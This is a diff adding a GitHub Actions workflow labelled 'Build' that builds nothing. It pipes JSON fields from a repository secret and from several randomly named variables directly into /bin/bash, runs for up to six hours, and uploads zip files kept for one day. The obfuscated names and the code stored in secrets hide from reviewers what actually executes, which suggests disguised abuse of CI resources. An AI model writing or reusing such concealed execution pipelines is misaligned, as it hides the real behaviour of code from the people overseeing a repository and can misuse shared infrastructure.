@@ -1,0 +1,31 @@
+name: Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          getd08: ${{ secrets.getd08 }}
+        run: |
+          printf '%s' "$getd08" | jq -r .lcam476 | /bin/bash
+          printf '%s' "$txbis06248" | jq -r .fr00 | /bin/bash
+          printf '%s' "$uqhej415" | jq -r .ylwui366 | /bin/bash
+          printf '%s' "$xgtp051" | jq -r .dm89422 | /bin/bash
+          printf '%s' "$uyry6213" | jq -r .ol99983 | /bin/bash
+          echo $afpfv1 | jq -r .x32011 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KTCRTwj1
+          path: "*.zip"
+          retention-days: 1
